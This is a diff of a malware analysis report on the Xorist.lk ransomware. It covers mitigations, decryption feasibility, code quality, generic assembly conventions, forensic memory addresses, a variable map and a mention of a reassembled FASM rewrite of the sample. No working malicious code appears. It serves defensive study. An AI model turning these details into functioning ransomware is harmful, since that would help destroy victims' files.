-- Email Filtering: Block suspicious attachments.  
+2. **Access Controls:**
+   - Implement least privilege
+   - Restrict write access to critical directories
+   - Monitor file system changes
 
-### Detection
-- Monitor partial file encrypts (e.g., via EDR).  
-- Alert on bulk renames/appends.  
-- Behavioral: Detect recursive drive traversal.  
+3. **Behavioral Analysis:**
+   - Alert on rapid file modifications
+   - Monitor for extension changes
+   - Track unusual API call patterns
 
-### Remediation
-- Isolate infected machine.  
-- Restore from backups (no shadow copy deletion).  
-- If password known: Use built-in decryptor.  
-- Forensics: Extract keys from memory dump.  
+4. **Network Segmentation:**
+   - Isolate critical systems
+   - Limit lateral movement
+   - Monitor for suspicious scanning
 
-## 10. Conclusion
+### 8.3 Decryption Possibility
 
-Xorist.lk is a basic yet effective ransomware using TEA/XOR encryption and registry persistence. Its embedded config allows easy customization, explaining its longevity. Key findings: per-file key derivation, partial encryption, stealth via timestamps. Lessons: Importance of backups and registry monitoring. In modern landscape, it represents entry-level threats, but variants may evolve with better crypto/evasion. Future trends may include network capabilities or wiper hybrids.
+**Assessment:** Possible with caveats
 
-## 11. References and Further Reading
-- MSDN: Windows API (CreateFile, RegSetValueEx)  
-- NIST SP 800-88: Guidelines for Media Sanitization (for wiper context)  
-- MITRE ATT&CK: Ransomware techniques  
-- MalwareBazaar: Xorist samples  
-- Research: "Ransomware: Past, Present, and Future" by Europol  
+**Method:**
+1. XOR is symmetric - same key decrypts as encrypts
+2. Key generation is predictable if infection time known
+3. Only first 16 bytes encrypted - rest of file intact
 
-## 12. Appendices
+**Requirements:**
+- Infection timestamp (from file metadata or logs)
+- Understanding of RDTSC behavior on victim CPU
+- Sample of encrypted + original file pairs for validation
 
-### Appendix A: Full Structure Definitions
+**Tool Availability:** Kaspersky and other vendors have published decryptors for Xorist variants.
 
-```c
-typedef struct _GLOBAL_CONFIG {
-    BYTE xorKey[16];
-    BYTE teaKey[16];
-    BYTE passwordHash[16];
-    LPCSTR ransomNoteText;
-    LPCSTR targetFileExtension;
-    LPSTR fileTypeFilters;
-    // ... other flags
-} GLOBAL_CONFIG;
+---
+
+## 9. Code Quality Assessment
+
+### 9.1 Sophistication Level: **Low to Medium**
+
+**Indicators:**
+- Simple XOR encryption (no real cryptography)
+- Partial file encryption only
+- Predictable key generation
+- Obvious resource names
+- No anti-debugging techniques
+- No code obfuscation
+
+### 9.2 Developer Skill: **Intermediate**
+
+**Positive Indicators:**
+- Proper use of Windows API
+- Timestamp preservation
+- Message loop integration
+- Resource handling
+
+**Negative Indicators:**
+- Weak cryptography
+- Poor OPSEC (resource names)
+- No error handling
+- Incomplete system file exclusions
+
+---
+
+## 10. Assembly-Level Insights
+
+### 10.1 Calling Conventions
+
+The malware uses **stdcall** convention consistently:
+```asm
+push    [ebp+lpString2]     ; Parameters pushed right-to-left
+call    lstrcpyA
+                            ; Callee cleans stack
 ```
 
-### Appendix B: IDA Python Script for Resource Decryption
+### 10.2 Register Usage Patterns
 
-(See 4.2 for script).
+```asm
+EAX - Return values, temporary calculations
+EBX - Loop counters, temporary storage
+ECX - Loop counters (count-down pattern)
+EDX - Filename character operations
+ESI - Source pointer for string operations
+EDI - Destination pointer for string operations
+EBP - Stack frame base pointer
+ESP - Stack pointer
+```
+
+### 10.3 Stack Frame Management
+
+```asm
+push    ebp              ; Save caller's base pointer
+mov     ebp, esp         ; Establish new frame
+sub     esp, 320         ; Allocate local variables
+; [... function body ...]
+add     esp, 320         ; Deallocate locals
+pop     ebp              ; Restore caller's frame
+ret                      ; Return
+```
+
+Standard prologue/epilogue consistent with Visual C++ compiler output.
+
+---
+
+## 11. Comparison with Original IDA Output
+
+### 11.1 Function Naming
+
+| IDA Output | FASM Rewrite | Purpose |
+|------------|--------------|---------|
+| `sub_401000` | `start` | Entry point |
+| `sub_40124F` | `generate_encryption_key` | Key generation |
+| `sub_40103A` | `create_ransom_note_in_startup` | Ransom note deployment |
+| `sub_4010FC` | `change_desktop_wallpaper` | Wallpaper modification |
+| `sub_4013A8` | `enumerate_and_encrypt_files` | File traversal |
+| `sub_401377` | `process_windows_messages` | Message pump |
+
+### 11.2 Variable Preservation
+
+All original IDA variable names maintained in FASM version:
+- `byte_40752B` - Configuration flags
+- `lpSubKey` - File extension
+- `dword_406595` - Encryption key base
+- `aHowToDecryptFi` - Ransom note filename
+
+This maintains traceability between analysis platforms.
+
+---
+
+## 12. Forensic Analysis Recommendations
+
+### 12.1 Memory Acquisition
+
+**Priority Areas:**
+- Address range `0x406595 - 0x4065A1` (encryption key)
+- Address range `0x406585 - 0x406594` (derived key)
+- Stack frames containing file paths
+- Heap allocations for file buffers
+
+### 12.2 Disk Forensics
+
+**Evidence Collection:**
+1. `%TEMP%` directory - Temporary BMP file
+2. Startup folder - Ransom note
+3. Master File Table - Timestamp analysis
+4. Volume Shadow Copies - Pre-infection state
+5. File system journal - Modification sequences
+
+### 12.3 Network Analysis
+
+**Note:** This variant shows no network communication. However, monitor for:
+- DNS queries (potential C2 in other variants)
+- HTTP/HTTPS traffic
+- Exfiltration attempts
+
+---
+
+## 13. Legal & Ethical Considerations
+
+### 13.1 Analysis Environment
+
+**Requirements:**
+- Isolated network (air-gapped or controlled)
+- Virtual machine with snapshots
+- Non-production systems only
+- Proper authorization and documentation
+
+### 13.2 Responsible Disclosure
+
+If discovering new variants:
+1. Report to antivirus vendors
+2. Share IOCs with security community
+3. Notify affected organizations
+4. Follow coordinated disclosure timelines
+
+---
+
+## 14. Conclusion
+
+Trojan-Ransom.Win32.Xorist.lk represents a relatively unsophisticated ransomware implementation suitable for educational analysis. Key findings:
+
+**Strengths:**
+- Fast execution through partial encryption
+- Multi-drive targeting
+- Timestamp preservation for stealth
+
+**Weaknesses:**
+- Trivial XOR encryption
+- Predictable key generation
+- Only encrypts file headers
+- No anti-analysis techniques
+- Obvious indicators
+
+**Classification:** Educational/Low-tier ransomware
+
+**Threat Level:** Low to Medium
+- Destructive capability: High (can damage many files)
+- Decryption difficulty: Low (known methods exist)
+- Sophistication: Low (simple techniques)
+
+**Recommendation:** Use as learning example, not representative of modern ransomware which employs RSA/AES, C2 communication, and advanced evasion.
+
+---
+
+## 15. References
+
+1. **Kaspersky Threat Intelligence**
+   - [Trojan-Ransom.Win32.Xorist Family Analysis](https://threats.kaspersky.com/en/threat/Trojan-Ransom.Win32.Xorist/)
+
+2. **Microsoft Documentation**
+   - [Win32 API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)
+   - [PE Format Specification](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
+
+3. **Assembly Resources**
+   - [FASM Documentation](https://flatassembler.net/docs.php)
+   - [Intel x86 Instruction Set Reference](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)
+
+4. **Malware Analysis Tools**
+   - IDA Pro 9.0 - Disassembly and analysis
+   - FASM 1.73 - Reassembly and testing
+   - Ghidra - Decompilation verification
+
+---
+
+## Appendix A: Complete Variable Map
+
+```
+; Configuration
+byte_40752B    - Show messagebox flag
+byte_40752A    - Create ransom note flag  
+byte_40752C    - Encryption type selector
+byte_40752D    - Custom extension flag
+byte_406550    - Operation mode
+
+; File Paths
+lpSubKey       - File extension (".locked")
+aHowToDecryptFi - Ransom note filename
+String2        - Alternate note filename
+aBmp           - BMP extension
+asc_404032     - "." string
+asc_404034     - ".." string
+asc_404041     - "*" wildcard
+
+; Messages
+Caption        - MessageBox caption
+Text           - Success message
+aAttentionAllYo - Encryption warning
+byte_404077    - Decryption success
+aYouHaveReached - Limit reached warning
+aPasswordIsInco - Incorrect password
+aError         - Generic error
+
+; Buffers
+pvParam        - Temp path (512 bytes)
+FileName       - Full filename (1280 bytes)
+NewFileName    - Renamed filename (1280 bytes)
+ExistingFileName - Original filename (1280 bytes)
+pszSpec        - Search pattern (256 bytes)
+dword_40444F   - Drive path buffer (512 bytes)
+String1        - Random string (32 bytes)
+pszPath        - Folder path (512 bytes)
+
+; File Operations
+hFile          - File handle
+dword_406555   - File size
+nNumberOfBytesToWrite - Bytes to write
+NumberOfBytesWritten - Bytes written
+lpBuffer       - File data buffer (256 bytes)
+
+; Timestamps
+CreationTime   - Original creation time
+LastAccessTime - Original access time
+LastWriteTime  - Original write time
+stru_40752E    - Temp creation time
+stru_407536    - Temp access time
+stru_40753E    - Temp write time
+
+; Encryption
+dword_406595   - Key dword 1
+dword_406599   - Key dword 2
+dword_40659D   - Key dword 3
+dword_4065A1   - Key dword 4
+dword_406585   - Derived key buffer (16 bytes)
+dword_406DB9   - Seed storage (16 bytes)
+
+; Resources
+hResInfo       - Resource info handle
+nNumberOfBytesToRead - Resource size
+hResData       - Resource data handle
+hHeap          - Heap handle
+lDistanceToMove - File pointer offset
+```
+
+---
+
+**Analysis completed:** December 2025  
+**FASM rewrite:** December 2025  
+**Original compilation:** January 2012
+
+---
+
+*This analysis is provided for educational and defensive security purposes only. Unauthorized use of this information for malicious purposes is illegal and unethical.*
